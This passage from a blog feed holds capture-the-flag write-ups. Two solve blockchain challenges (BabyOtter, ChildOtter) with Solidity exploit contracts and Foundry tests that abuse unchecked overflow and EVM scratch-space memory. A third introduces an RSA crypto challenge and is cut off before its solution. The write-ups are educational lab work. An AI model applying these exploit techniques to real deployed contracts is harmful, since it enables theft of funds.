&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@flores.eugenio03&#x2F;exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018&quot; target=_blank&gt;Storage Layout&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.trustlook.com&#x2F;understand-evm-bytecode-part-2&#x2F;&quot; target=_blank&gt;blog.trustlook.com&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;book.getfoundry.sh&#x2F;&quot; target=_blank&gt;Foundry Book&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you for reading!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hacked Labs x Osec CTF 2023</title>
        <published>2023-10-02T00:00:00+00:00</published>
        <updated>2023-10-02T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/hackedlabsctf/"/>
        <id>https://themj0ln1r.github.io/writeups/hackedlabsctf/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/hackedlabsctf/">&lt;p&gt;Hello peers, I participated in a blockchain ctf conducted by 0xHacked Labs and OtterSec. These are the challenge writeups which i solved. We dont submit any flag to solve the challenge, we need to generate the ZK Proof of our exploit then that ZK Proof should be submitted to solve the challenge.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;babyotter&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#babyotter&quot; aria-label=&quot;Anchor link for: babyotter&quot;&gt;BabyOtter&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;As easy as 1, 2, 1337..
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;rpc: http:&#x2F;&#x2F;18.207.142.64:38545
&lt;&#x2F;span&gt;&lt;span&gt;contract: 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3
&lt;&#x2F;span&gt;&lt;span&gt;block_number: 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [ https:&#x2F;&#x2F;github.com&#x2F;0xHackedLabs&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;src&#x2F;BabyOtter&#x2F;BabyOtter.sol ]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;BabyOtter.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract BabyOtter {
&lt;&#x2F;span&gt;&lt;span&gt;    bool public solved = false;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function solve(uint x) public {
&lt;&#x2F;span&gt;&lt;span&gt;        unchecked {
&lt;&#x2F;span&gt;&lt;span&gt;            assert(x * 0x1337 == 1);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        solved = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The observation is that the contract uses &lt;code&gt;unchecked&lt;&#x2F;code&gt; block. unchecked block wont check for overflow of integer arithmetic. That means a &lt;code&gt;uint256&lt;&#x2F;code&gt; variable can store values less than &lt;code&gt;2**256-1&lt;&#x2F;code&gt;. If we tried to store values more than this value the value will be wrapped to mod &lt;code&gt;2**256&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Simply, &lt;code&gt;uint256 x = 2**256 + 1&lt;&#x2F;code&gt; will become &lt;code&gt;0&lt;&#x2F;code&gt;. &lt;code&gt;uint256 x = 2**256 + 2&lt;&#x2F;code&gt; will be &lt;code&gt;1&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;So, we need to find value of &lt;code&gt;x&lt;&#x2F;code&gt; such that which can satisfy the equation &lt;code&gt;x * 0x1337 = 1&lt;&#x2F;code&gt;. We can think of this as a modular multiplicative inverse.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;x = pow(0x1337, -1, 2**256)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In solidity we can find this as &lt;code&gt;x  =  0x1337 ** (2**254 -1)&lt;&#x2F;code&gt;. So, simply calling solve function with this value with the x value to solve the chalenge.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Exploit.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface IBabyOtter {
&lt;&#x2F;span&gt;&lt;span&gt;    function solve(uint x) external;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Exploit {
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; write code here
&lt;&#x2F;span&gt;&lt;span&gt;        address target = 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3;
&lt;&#x2F;span&gt;&lt;span&gt;        uint leet = 0x1337;
&lt;&#x2F;span&gt;&lt;span&gt;        uint x;
&lt;&#x2F;span&gt;&lt;span&gt;        unchecked{x  =  leet ** (2**254 -1);}
&lt;&#x2F;span&gt;&lt;span&gt;        IBabyOtter(target).solve(x);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can test this challenge with foundry test script.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Exploit.t.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Exploit as BoE} from &amp;quot;..&#x2F;src&#x2F;BabyOtter&#x2F;Exploit.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;interface IChallenge {
&lt;&#x2F;span&gt;&lt;span&gt;    function solved() external returns(bool);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ExploitTest is Test {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setUp() public {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; fork the ctf chain
&lt;&#x2F;span&gt;&lt;span&gt;        vm.createSelectFork(&amp;quot;http:&#x2F;&#x2F;18.207.142.64:38545&amp;quot;, 3);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function test_babyotter() public {
&lt;&#x2F;span&gt;&lt;span&gt;        address target = 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        BoE exp = new BoE();
&lt;&#x2F;span&gt;&lt;span&gt;        exp.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;        assertTrue(IChallenge(target).solved());
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;forge test --match-test test_babyotter -vv&lt;&#x2F;code&gt; will confirm the challenge is solved. Submitting the exploit ZK Proof will credit some points in CTF.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;childotter&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#childotter&quot; aria-label=&quot;Anchor link for: childotter&quot;&gt;ChildOtter&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;rpc: http:&#x2F;&#x2F;18.207.142.64:38545
&lt;&#x2F;span&gt;&lt;span&gt;contract: 0x63461D5b5b83bD9BA102fF21d8533b3aad172116
&lt;&#x2F;span&gt;&lt;span&gt;block_number: 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [ https:&#x2F;&#x2F;github.com&#x2F;0xHackedLabs&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;src&#x2F;ChildOtter&#x2F;ChildOtter.sol ]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ChildOtter {
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint =&amp;gt; mapping(uint =&amp;gt; uint)) val;
&lt;&#x2F;span&gt;&lt;span&gt;    bool public solved = false;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function solve(uint x) public { 
&lt;&#x2F;span&gt;&lt;span&gt;      uint target;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;      val[0][0] = x;
&lt;&#x2F;span&gt;&lt;span&gt;      assembly {
&lt;&#x2F;span&gt;&lt;span&gt;        target := mload(32)
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;      assert(target == x);
&lt;&#x2F;span&gt;&lt;span&gt;      solved = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This is the challenge for which I learned a lot of new things. To solve this I revised entire EVM internals from many sources(see references).&lt;&#x2F;p&gt;
&lt;p&gt;The challenge goal is to call the solve function with the value which is store at the EVM memory 32 bytes to 64 bytes. That is what actually &lt;code&gt;mload(32)&lt;&#x2F;code&gt; is doing.&lt;&#x2F;p&gt;
&lt;p&gt;Solidity reserves four 32-byte slots, with specific byte ranges (inclusive of endpoints) being used as follows:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;0x00 - 0x3f&lt;&#x2F;code&gt; (64 bytes): scratch space for hashing methods&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;0x40 - 0x5f&lt;&#x2F;code&gt; (32 bytes): currently allocated memory size (aka. free memory pointer)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;0x60 - 0x7f&lt;&#x2F;code&gt; (32 bytes): zero slot&lt;&#x2F;p&gt;
&lt;p&gt;Scratch space can be used between statements (i.e. within inline assembly). The zero slot is used as initial value for dynamic memory arrays and should never be written to (the free memory pointer points to 0x80 initially).&lt;&#x2F;p&gt;
&lt;p&gt;The challenge contract defines a nested mapping and stored a value in the mapping at &lt;code&gt;key [0][0]&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The variable &lt;code&gt;val&lt;&#x2F;code&gt; is assigned to storage slot 0 (simply because it is the first one). But the mapped elements are elsewhere.&lt;&#x2F;p&gt;
&lt;p&gt;To compute the storage slot or location of the mapped elements, the following is used :&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;slot = keccak256([key, mappingSlot]) &#x2F;&#x2F; concatenate key and mapping slot&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, when storing values in a mapping EVM will compute keccak256 hash of the key and mapping slot. EVM will use &lt;code&gt;scratch space&lt;&#x2F;code&gt; to perform hashing. So, that means &lt;code&gt;0x00-0x3f&lt;&#x2F;code&gt;(0 - 64 bytes) will store the &lt;code&gt;keccak256([0,0])&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The actual &lt;code&gt;value[0][0] = x&lt;&#x2F;code&gt; will be stored at &lt;code&gt;storage&lt;&#x2F;code&gt; slot &lt;code&gt;uint(keccak256([0,keccak256([0,0]))))&lt;&#x2F;code&gt;. In memory from &lt;code&gt;32 bytes to 64 bytes&lt;&#x2F;code&gt; are used to store the &lt;code&gt;keccak256([0,0])&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Lets confirm this with remix debugger.&lt;&#x2F;p&gt;
&lt;img src =&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;hackedlabs23&#x2F;hackedlabsctf_1.png&quot; alt=&quot;childOtter remix&quot; class=&quot;autoimg&quot;&gt;
&lt;p&gt;Calling solve function with this value will solve the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Exploit.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface IChildOtter {
&lt;&#x2F;span&gt;&lt;span&gt;    function solve(uint x) external;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;contract Exploit {
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; write code here
&lt;&#x2F;span&gt;&lt;span&gt;        address target = 0x63461D5b5b83bD9BA102fF21d8533b3aad172116;
&lt;&#x2F;span&gt;&lt;span&gt;        uint x = uint(keccak256(abi.encode(0,0))); &#x2F;&#x2F; slot 0, key 0
&lt;&#x2F;span&gt;&lt;span&gt;        IChildOtter(target).solve(x);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can test this challenge with foundry test script.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Exploit.t.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.13;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Exploit as CoE} from &amp;quot;..&#x2F;src&#x2F;ChildOtter&#x2F;Exploit.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;interface IChallenge {
&lt;&#x2F;span&gt;&lt;span&gt;    function solved() external returns(bool);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ExploitTest is Test {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setUp() public {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; fork the ctf chain
&lt;&#x2F;span&gt;&lt;span&gt;        vm.createSelectFork(&amp;quot;http:&#x2F;&#x2F;18.207.142.64:38545&amp;quot;, 3);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function test_childotter() public {
&lt;&#x2F;span&gt;&lt;span&gt;        address target = 0x63461D5b5b83bD9BA102fF21d8533b3aad172116;
&lt;&#x2F;span&gt;&lt;span&gt;        CoE exp = new CoE();
&lt;&#x2F;span&gt;&lt;span&gt;        exp.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;        assertTrue(IChallenge(target).solved());
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;forge test --match-test test_childotter -vv&lt;&#x2F;code&gt; will confirm the challenge is solved. Submitting the exploit ZK Proof will credit some points in CTF.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h3 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ethereum.stackexchange.com&#x2F;questions&#x2F;114186&#x2F;how-does-ethereum-fit-a-mapping-into-storage&quot; target=_blank&gt;StackOverflow&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;latest&#x2F;internals&#x2F;layout_in_memory.html&quot; target=_blank&gt;Solidity lang docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;i_LwhlFNSkI?feature=shared&quot; target=_blank&gt;How mappings stored in EVM - MappingsJesper Kristensen YT&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Ru3inmu1FuQ?feature=shared&quot; target=_blank&gt;EVM Explained - Owen Thurm YT&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;kCswGz9naZg?feature=shared&quot; target=_blank&gt;EVM Guide - Jordan McKinney YT&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Nullcon Hackim CTF 2023</title>
        <published>2023-08-20T00:00:00+00:00</published>
        <updated>2023-08-20T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/nullconhackimctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/nullconhackimctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/nullconhackimctf23/">&lt;p&gt;Long time no see? I have been learning things in Blockchain technology in last few months. Now everything at good pace hope I can solve more CTF&#x27;s now. As comeback match, I solved this crypto challenge in &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2065&quot; target=_blank&gt;NullCon HackIM CTF 2023&lt;&#x2F;a&gt; yesterday.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto-euclideanrsa&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-euclideanrsa&quot; aria-label=&quot;Anchor link for: crypto-euclideanrsa&quot;&gt;Crypto - EuclideanRSA&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Attached Files : [euclidean-RSA.py, output.txt]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;euclidean-RSA.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;PublicKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;RSA
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;bytes_to_long
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;magic
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;RSA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2048&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		a,b,c,d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;magic&lt;&#x2F;span&gt;&lt;span&gt;(key)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d]:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;_&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span&gt;(flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(cipher)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;output.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
